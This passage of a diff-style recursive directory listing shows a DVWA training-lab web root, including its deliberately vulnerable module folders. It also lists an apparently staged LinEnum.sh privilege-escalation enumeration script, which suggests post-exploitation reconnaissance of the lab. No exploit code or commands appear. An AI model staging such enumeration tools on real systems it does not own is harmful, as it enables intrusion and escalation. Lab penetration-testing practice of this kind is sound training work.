+-rw-rw-r--  1 www-data www-data  585 Nov  9 03:25 HostBlacklist.php
+-rw-rw-r--  1 www-data www-data 4.4K Nov  9 03:25 MakeAbsolute.php
+-rw-rw-r--  1 www-data www-data 2.1K Nov  9 03:25 Munge.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/URIScheme:
+total 32K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data 1.5K Nov  9 03:25 ftp.php
+-rw-rw-r--  1 www-data www-data  450 Nov  9 03:25 http.php
+-rw-rw-r--  1 www-data www-data  203 Nov  9 03:25 https.php
+-rw-rw-r--  1 www-data www-data  695 Nov  9 03:25 mailto.php
+-rw-rw-r--  1 www-data www-data  510 Nov  9 03:25 news.php
+-rw-rw-r--  1 www-data www-data  461 Nov  9 03:25 nntp.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/VarParser:
+total 16K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data 3.9K Nov  9 03:25 Flexible.php
+-rw-rw-r--  1 www-data www-data  684 Nov  9 03:25 Native.php
+
+/var/www/html/external/phpids/0.6/tests:
+total 20K
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.1K Nov  9 03:25 allTests.php
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 coverage
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 IDS
+
+/var/www/html/external/phpids/0.6/tests/coverage:
+total 2.2M
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  150 Nov  9 03:25 butter.png
+-rw-rw-r-- 1 www-data www-data  83K Nov  9 03:25 Caching_Factory.php.html
+-rw-rw-r-- 1 www-data www-data 103K Nov  9 03:25 Caching_File.php.html
+-rw-rw-r-- 1 www-data www-data 9.7K Nov  9 03:25 Caching.html
+-rw-rw-r-- 1 www-data www-data  20K Nov  9 03:25 Caching_Interface.php.html
+-rw-rw-r-- 1 www-data www-data  44K Nov  9 03:25 Caching_Session.php.html
+-rw-rw-r-- 1 www-data www-data  150 Nov  9 03:25 chameleon.png
+-rw-rw-r-- 1 www-data www-data   85 Nov  9 03:25 close12_1.gif
+-rw-rw-r-- 1 www-data www-data 6.6K Nov  9 03:25 container.css
+-rw-rw-r-- 1 www-data www-data  64K Nov  9 03:25 container-min.js
+-rw-rw-r-- 1 www-data www-data 587K Nov  9 03:25 Converter.php.html
+-rw-rw-r-- 1 www-data www-data 124K Nov  9 03:25 Event.php.html
+-rw-rw-r-- 1 www-data www-data 3.9K Nov  9 03:25 Filter.html
+-rw-rw-r-- 1 www-data www-data  96K Nov  9 03:25 Filter.php.html
+-rw-rw-r-- 1 www-data www-data 276K Nov  9 03:25 Filter_Storage.php.html
+-rw-rw-r-- 1 www-data www-data  167 Nov  9 03:25 glass.png
+-rw-rw-r-- 1 www-data www-data  16K Nov  9 03:25 index.html
+-rw-rw-r-- 1 www-data www-data  96K Nov  9 03:25 Init.php.html
+-rw-rw-r-- 1 www-data www-data 390K Nov  9 03:25 Monitor.php.html
+-rw-rw-r-- 1 www-data www-data 159K Nov  9 03:25 Report.php.html
+-rw-rw-r-- 1 www-data www-data  150 Nov  9 03:25 scarlet_red.png
+-rw-rw-r-- 1 www-data www-data  141 Nov  9 03:25 snow.png
+-rw-rw-r-- 1 www-data www-data 7.5K Nov  9 03:25 style.css
+-rw-rw-r-- 1 www-data www-data  31K Nov  9 03:25 yahoo-dom-event.js
+
+/var/www/html/external/phpids/0.6/tests/IDS:
+total 108K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.7K Nov  9 03:25 CachingTest.php
+-rw-rw-r-- 1 www-data www-data 2.3K Nov  9 03:25 EventTest.php
+-rw-rw-r-- 1 www-data www-data 4.1K Nov  9 03:25 ExceptionTest.php
+-rw-rw-r-- 1 www-data www-data 3.0K Nov  9 03:25 FilterTest.php
+-rw-rw-r-- 1 www-data www-data 2.8K Nov  9 03:25 InitTest.php
+-rw-rw-r-- 1 www-data www-data  71K Nov  9 03:25 MonitorTest.php
+-rw-rw-r-- 1 www-data www-data 3.6K Nov  9 03:25 ReportTest.php
+
+/var/www/html/external/recaptcha:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  969 Nov  9 03:25 recaptchalib.php
+
+/var/www/html/.git:
+total 132K
+drwxrwxr-x  8 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 branches
+-rw-rw-r--  1 www-data www-data  262 Nov  9 03:25 config
+-rw-rw-r--  1 www-data www-data   73 Nov  9 03:25 description
+-rw-rw-r--  1 www-data www-data   23 Nov  9 03:25 HEAD
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 hooks
+-rw-rw-r--  1 www-data www-data  82K Nov  9 03:25 index
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 info
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 logs
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 objects
+-rw-rw-r--  1 www-data www-data  526 Nov  9 03:25 packed-refs
+drwxrwxr-x  5 www-data www-data 4.0K Nov  9 03:25 refs
+
+/var/www/html/.git/branches:
+total 8.0K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+
+/var/www/html/.git/hooks:
+total 68K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+-rwxrwxr-x 1 www-data www-data  478 Nov  9 03:25 applypatch-msg.sample
+-rwxrwxr-x 1 www-data www-data  896 Nov  9 03:25 commit-msg.sample
+-rwxrwxr-x 1 www-data www-data 4.6K Nov  9 03:25 fsmonitor-watchman.sample
+-rwxrwxr-x 1 www-data www-data  189 Nov  9 03:25 post-update.sample
+-rwxrwxr-x 1 www-data www-data  424 Nov  9 03:25 pre-applypatch.sample
+-rwxrwxr-x 1 www-data www-data 1.7K Nov  9 03:25 pre-commit.sample
+-rwxrwxr-x 1 www-data www-data  416 Nov  9 03:25 pre-merge-commit.sample
+-rwxrwxr-x 1 www-data www-data 1.5K Nov  9 03:25 prepare-commit-msg.sample
+-rwxrwxr-x 1 www-data www-data 1.4K Nov  9 03:25 pre-push.sample
+-rwxrwxr-x 1 www-data www-data 4.8K Nov  9 03:25 pre-rebase.sample
+-rwxrwxr-x 1 www-data www-data  544 Nov  9 03:25 pre-receive.sample
+-rwxrwxr-x 1 www-data www-data 2.8K Nov  9 03:25 push-to-checkout.sample
+-rwxrwxr-x 1 www-data www-data 3.6K Nov  9 03:25 update.sample
+
+/var/www/html/.git/info:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  240 Nov  9 03:25 exclude
+
+/var/www/html/.git/logs:
+total 16K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  176 Nov  9 03:25 HEAD
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 refs
+
+/var/www/html/.git/logs/refs:
+total 16K
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 heads
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 remotes
+
+/var/www/html/.git/logs/refs/heads:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  176 Nov  9 03:25 master
+
+/var/www/html/.git/logs/refs/remotes:
+total 12K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 origin
+
+/var/www/html/.git/logs/refs/remotes/origin:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  176 Nov  9 03:25 HEAD
+
+/var/www/html/.git/objects:
+total 16K
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 info
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 pack
+
+/var/www/html/.git/objects/info:
+total 8.0K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+
+/var/www/html/.git/objects/pack:
+total 1.8M
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-r--r--r-- 1 www-data www-data  99K Nov  9 03:25 pack-4debfd680ddf57c4a734df0a3ca9f32dee9e1189.idx
+-r--r--r-- 1 www-data www-data 1.7M Nov  9 03:25 pack-4debfd680ddf57c4a734df0a3ca9f32dee9e1189.pack
+
+/var/www/html/.git/refs:
+total 20K
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 heads
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 remotes
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 tags
+
+/var/www/html/.git/refs/heads:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data   41 Nov  9 03:25 master
+
+/var/www/html/.git/refs/remotes:
+total 12K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 origin
+
+/var/www/html/.git/refs/remotes/origin:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data   32 Nov  9 03:25 HEAD
+
+/var/www/html/.git/refs/tags:
+total 8.0K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+
+/var/www/html/.github:
+total 12K
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 workflows
+
+/var/www/html/.github/workflows:
+total 20K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.6K Nov  9 03:25 codeql-analysis.yml
+-rw-rw-r-- 1 www-data www-data  426 Nov  9 03:25 pytest.yml
+-rw-rw-r-- 1 www-data www-data 1.3K Nov  9 03:25 shiftleft-analysis.yml
+
+/var/www/html/hackable:
+total 20K
+drwxrwxr-x  5 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 flags
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 uploads
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 users
+
+/var/www/html/hackable/flags:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  678 Nov  9 03:25 fi.php
+
+/var/www/html/hackable/uploads:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  667 Nov  9 03:25 dvwa_email.png
+
+/var/www/html/hackable/users:
+total 32K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.6K Nov  9 03:25 1337.jpg
+-rw-rw-r-- 1 www-data www-data 3.5K Nov  9 03:25 admin.jpg
+-rw-rw-r-- 1 www-data www-data 3.0K Nov  9 03:25 gordonb.jpg
+-rw-rw-r-- 1 www-data www-data 2.9K Nov  9 03:25 pablo.jpg
+-rw-rw-r-- 1 www-data www-data 4.3K Nov  9 03:25 smithy.jpg
+
+/var/www/html/tests:
+total 16K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+-rw-rw-r--  1 www-data www-data  321 Nov  9 03:25 README.md
+-rw-rw-r--  1 www-data www-data 2.7K Nov  9 03:25 test_url.py
+
+/var/www/html/vulnerabilities:
+total 684K
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 brute
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 captcha
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 csp
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 csrf
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 exec
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 fi
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 javascript
+-rw-r--r--  1 www-data www-data 606K Nov 17 07:39 LinEnum.sh
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 sqli
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 sqli_blind
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 upload
+-rw-rw-r--  1 www-data www-data  822 Nov  9 03:25 view_help.php
+-rw-rw-r--  1 www-data www-data 2.7K Nov  9 03:25 view_source_all.php
+-rw-rw-r--  1 www-data www-data 2.3K Nov  9 03:25 view_source.php
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 weak_id
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 xss_d
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 xss_r
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 xss_s
+
+/var/www/html/vulnerabilities/brute:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 2.0K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/brute/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.7K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/brute/source:
+total 28K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.9K Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data 4.3K Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data 1.1K Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data 1.6K Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/captcha:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 3.1K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/captcha/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.4K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/captcha/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.9K Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data 2.9K Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data 2.6K Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data 2.9K Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/csp:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 1.7K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/csp/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.4K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/csp/source:
+total 40K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  428 Nov  9 03:25 high.js
+-rw-rw-r-- 1 www-data www-data  548 Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data  421 Nov  9 03:25 impossible.js
+-rw-rw-r-- 1 www-data www-data  617 Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data  144 Nov  9 03:25 jsonp_impossible.php
+-rw-rw-r-- 1 www-data www-data  247 Nov  9 03:25 jsonp.php
+-rw-rw-r-- 1 www-data www-data  823 Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data  703 Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/csrf:
+total 24K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 2.6K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+-rw-rw-r--  1 www-data www-data 2.0K Nov  9 03:25 test_credentials.php
+
+/var/www/html/vulnerabilities/csrf/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.7K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/csrf/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.4K Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data 2.1K Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data 1.2K Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data 1.5K Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/exec:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 1.8K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/exec/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/exec/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  741 Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data 1.2K Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data  404 Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data  630 Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/fi:
+total 40K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+-rw-rw-r--  1 www-data www-data 1.1K Nov  9 03:25 file1.php
+-rw-rw-r--  1 www-data www-data 1.1K Nov  9 03:25 file2.php
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 file3.php
+-rw-rw-r--  1 www-data www-data  372 Nov  9 03:25 file4.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 1.4K Nov  9 03:25 include.php
+-rw-rw-r--  1 www-data www-data 1005 Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/fi/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.7K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/fi/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  236 Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data  302 Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data   73 Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data  222 Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/javascript:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 3.3K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/javascript/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.3K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/javascript/source:
+total 60K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  11K Nov  9 03:25 high.js
+-rw-rw-r-- 1 www-data www-data  126 Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data  19K Nov  9 03:25 high_unobfuscated.js
+-rw-rw-r-- 1 www-data www-data    0 Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data 4.1K Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data  258 Nov  9 03:25 medium.js
+-rw-rw-r-- 1 www-data www-data  128 Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/sqli:
+total 24K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 2.5K Nov  9 03:25 index.php
+-rw-rw-r--  1 www-data www-data  890 Nov  9 03:25 session-input.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/sqli/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.9K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/sqli/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.5K Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data 1.9K Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data 1.7K Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data 2.0K Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/sqli_blind:
+total 24K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+-rw-rw-r--  1 www-data www-data  815 Nov  9 03:25 cookie-input.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 3.3K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/sqli_blind/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.1K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/sqli_blind/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.5K Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data 1.8K Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data 1.3K Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data 1.5K Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/upload:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 2.2K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/upload/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.4K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/upload/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.1K Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data 2.3K Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data  511 Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data  965 Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/weak_id:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 1.4K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
